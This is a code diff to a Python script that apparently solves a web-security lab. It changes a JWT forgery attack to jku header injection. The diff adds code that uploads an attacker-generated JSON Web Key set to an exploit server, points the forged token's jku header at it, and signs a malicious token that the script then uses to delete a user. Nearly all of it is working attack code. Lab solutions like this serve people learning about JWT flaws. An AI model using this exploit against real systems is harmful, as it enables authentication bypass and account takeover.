@@ -11,8 +11,9 @@ import json
 
 
 class Solver:
-    def __init__(self, lab_url):
+    def __init__(self, lab_url, exploit_server_url):
         self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
+        self.exploit_server_url = exploit_server_url if exploit_server_url.endswith('/') else exploit_server_url + '/'
 
     def get_csrf(self):
         response = requests.get(self.lab_url + 'login')
@@ -73,6 +74,17 @@ class Solver:
         )
         return signature
 
+    def upload_jku(self, jku):
+        data = {
+            'urlIsHttps': 'on',
+            'responseFile': '/exploit',
+            'responseHead': 'HTTP/1.1 200 OK',
+            'Content-Type': 'text/html; charset=utf-8',
+            'responseBody': '{}'.format(json.dumps(jku)),
+            'formAction': 'STORE'
+        }
+        requests.post(self.exploit_server_url, data=data)
+
     def generate_malicious_token(self):
         private_pem, public_pem = self.generate_rsa_key_pair()
         n, e = self.extract_n_and_e_from_public_key(public_pem)
@@ -83,7 +95,9 @@ class Solver:
         header = base64.urlsafe_b64decode(header)
         json_header = json.loads(header.decode())
         jwk['jwk']['kid'] = json_header['kid']
-        json_header.update(jwk)
+        jku = {'keys': [jwk['jwk']]}
+        self.upload_jku(jku)
+        json_header['jku'] = self.exploit_server_url + 'exploit'
         header = json.dumps(json_header).encode()
         header = base64.urlsafe_b64encode(header).rstrip(b'=')
         payload += '=' * (len(payload) % 4)
@@ -107,5 +121,5 @@ class Solver:
         self.delete_the_user()
 
 
-solver = Solver(sys.argv[1])
+solver = Solver(sys.argv[1], sys.argv[2])
 solver.start()
